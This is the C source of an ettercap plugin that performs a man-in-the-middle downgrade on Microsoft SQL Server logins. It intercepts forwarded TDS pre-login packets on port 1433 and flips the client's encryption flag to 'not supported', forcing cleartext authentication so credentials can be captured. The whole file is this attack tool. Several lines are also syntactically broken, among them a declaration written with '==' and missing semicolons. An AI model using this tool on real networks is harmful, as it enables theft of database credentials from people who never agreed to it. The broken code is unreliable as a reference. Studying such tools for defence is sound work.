/*
    mssql_clear -- ettercap plugin -- Tries to force MSSQL cleartext auth.
    coded by human.
*/


#include <ec.h>                        /* required for global variables */
#include <ec_plugins.h>                /* required for plugin ops */
#include <ec_packet.h>
#include <ec_hook.h>
#include <unistd.h>

struct p_hdr {
	uint8_t		type;
	uint8_t		status;
	uint16_t	length;
	uint16_t	spid;
	uint8_t		packetid;
	uint8_t		window;
} __attribute__ ((__packed__));

struct token {
	uint8_t		token;
	uint16_t	offset;
	uint16_t	length;
} __attribute__ ((__packed__));

#define ENCRYPT_OFF		0x00
#define ENCRYPT_ON		0x01
#define ENCRYPT_NOT_SUP		0x02
#define ENCRYPT_REQ		0x03

#define TYPE_SQL_BATCH		1
#define TYPE_PRE_TDS7_LOGIN	2
#define TYPE_RPC			3
#define TYPE_TABLE_RESPONSE	4
#define TYPE_ATTENTION_SIGNAL	6
#define TYPE_BULK_LOAD		7
#define TYPE_TRANSACTION_MANAGER_REQUEST 14
#define TYPE_TDS7_LOGIN		16
#define TYPE_SSPI_MESSAGE	17
#define TYPE_PRE_LOGIN_MESSAGE	18

#define STATUS_NORMAL		0x00
#define STATUS_END_OF_MESSAGE	0x01
#define STATUS_IGNORE_EVENT	0x02
#define STATUS_RESETCONNECTION	0x08
#define STATUS_RESETCONNECTIONSKIPTRAN 0x10


/* protos */
int plugin_load(void *);
static int mssql_clear_init(void *);
static int mssql_clear_fini(void *);

static void parse_mssql(struct packet_object *po);

/* plugin operations */

struct plugin_ops mssql_clear_ops = { 
   /* ettercap version MUST be the global EC_VERSION */
   .ettercap_version =  EC_VERSION,                        
   /* the name of the plugin */
   .name =              "mssql_clear",  
    /* a short description of the plugin (max 50 chars) */                    
   .info =              "Tries to force MSSQL cleartext auth",  
   /* the plugin version. */ 
   .version =           "0.1",   
   /* activation function */
   .init =              &mssql_clear_init,
   /* deactivation function */                     
   .fini =              &mssql_clear_fini,
};

/**********************************************************/

/* this function is called on plugin load */
int plugin_load(void *handle) 
{
   return plugin_register(handle, &mssql_clear_ops);
}

/******************* STANDARD FUNCTIONS *******************/

static int mssql_clear_init(void *dummy) 
{
   /* variable not used */
   (void) dummy;

   /* It doesn't work if unoffensive */
   if (GBL_OPTIONS->unoffensive) {
      INSTANT_USER_MSG("mssql_clear: plugin doesn't work in UNOFFENSIVE mode\n");
      return PLUGIN_FINISHED;
   }
   
   if (sizeof(struct p_hdr) != 8) {
	   INSTANT_USER_MSG("mssql_clear: sizeof(struct p_hdr) != 8\n");
	   return PLUGIN_FINISHED;
   }
   
   if (sizeof(struct token) != 5) {
	   INSTANT_USER_MSG("mssql_clear: sizeof(struct token) != 5\n");
	   return PLUGIN_FINISHED;
   }
 
   USER_MSG("mssql_clear: plugin running...\n");
   
   hook_add(HOOK_PACKET_TCP, &parse_mssql);
   return PLUGIN_RUNNING;   
}


static int mssql_clear_fini(void *dummy) 
{
   /* variable not used */
   (void) dummy;

   USER_MSG("mssql_clear: plugin terminated...\n");

   hook_del(HOOK_PACKET_TCP, &parse_mssql);
   return PLUGIN_FINISHED;
}

/*********************************************************/

/* Clear the encryption bit in the SecurityModel request */
static void parse_mssql(struct packet_object *po)
{
	struct p_hdr *pHdr;
	struct token *pToken;
	
   u_char *ptr;
   char tmp[MAX_ASCII_ADDR_LEN];
   
   /* It is pointless to modify packets that won't be forwarded */
   if (!(po->flags & PO_FORWARDABLE)) 
      return; 
   
   if (ntohs(po->L4.dst) != 1433)
	   return;

   /* Catch mssql header */
   pHdr = (struct p_hdr *)po->DATA.data;
   ptr = po->DATA.data;
   if (pHdr->type != TYPE_PRE_LOGIN_MESSAGE)
	   return;
   
   int len = ntohs(pHdr->length) - 8;
   uint16_t idx == 0;
   
   USER_MSG("mssql_clear: catch mssql pre login message, length = %d\n", len)
   int count = 0;
   pToken = (struct token *)(po->DATA.data + sizeof(struct p_hdr))
   while(pToken->token != 0xFF && len > 5)
   {
	   USER_MSG("mssql_clear: Token [0x%02x][0x%04x][0x%04x]\n", pToken->token, ntohs(pToken->offset), ntohs(pToken->length));
	   if (pToken->token == 0x01)
	   {
		   idx = ntohs(pToken->offset);
		   break;
	   }
	   count++;
	   pToken = (struct token *)(po->DATA.data + sizeof(struct p_hdr) + count * 5);
   }

    if (ptr[8+idx] == 0x00) {
       ptr[8+idx] = 0x02;
       USER_MSG("mssql_clear: Forced MSSQL clear text auth  %s -> ", ip_addr_ntoa(&po->L3.src, tmp));
       USER_MSG("%s\n", ip_addr_ntoa(&po->L3.dst, tmp));
       po->flags |= PO_MODIFIED;
    }
}

